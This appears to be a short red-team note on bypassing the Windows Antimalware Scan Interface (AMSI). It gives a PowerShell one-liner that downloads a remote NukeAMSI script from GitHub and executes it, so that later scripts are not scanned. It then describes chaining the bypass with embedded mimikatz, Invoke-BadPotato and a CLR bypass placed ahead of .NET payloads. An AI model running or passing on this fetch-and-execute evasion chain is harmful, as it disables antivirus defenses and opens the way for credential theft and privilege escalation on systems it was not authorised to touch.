# Defense Evasion: AMSI Bypass

## How it work

This technique based on some methods to dealing with the AMSI (Antimalware Scan Interface) like exploiting the amsi.dll and/or relevent service.

Hence within succession we can bypass antimalware scan from modern AV, not only Windows but also others as most is using the same AMSI service.

## Methods

### NukeAMSI

#### What is this

A new attack that targeting to a bug in `amsi.dll` that allow user to write on some code address

#### Running

You can download script from [NukeAMSI.ps1](https://github.com/anonymous300502/Nuke-AMSI/blob/main/NukeAMSI.ps1) then run in powershell, or invoke by running:
```powershell
iex (iwr "https://raw.githubusercontent.com/anonymous300502/Nuke-AMSI/refs/heads/main/NukeAMSI.ps1" -UseBasicParsing).Content
```

Then we can running powershell script without being scanned by AMSI

#### Usage

- Powershell script (.ps1): We can directly run it
- Native PE Bynary: We can embed it into a powershell script like how they embed `mimikatz.exe` into [Invoke-Mimikatz.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)
- .NET PE Binary: 
    - I have tested this with [Invoke-BadPotato.ps1](https://github.com/Zanitas404/Invoke-BadPotato/blob/main/Invoke-BadPotato.ps1) and other .NET binary, but I always get this error
      ![image](https://github.com/user-attachments/assets/8db04ce3-3282-4db9-b203-b95f2d52901e)

    - Thanks to [Vixx's repo](https://github.com/V-i-x-x/AMSI-BYPASS/tree/main), I have done some research and successful deal with this problem
    - Now we should run this [Invoke-ClrBypass.ps1]() before running our .NET payload, for more detail please refer [this](Payloads\Invoke-ClrBypass\README.md)
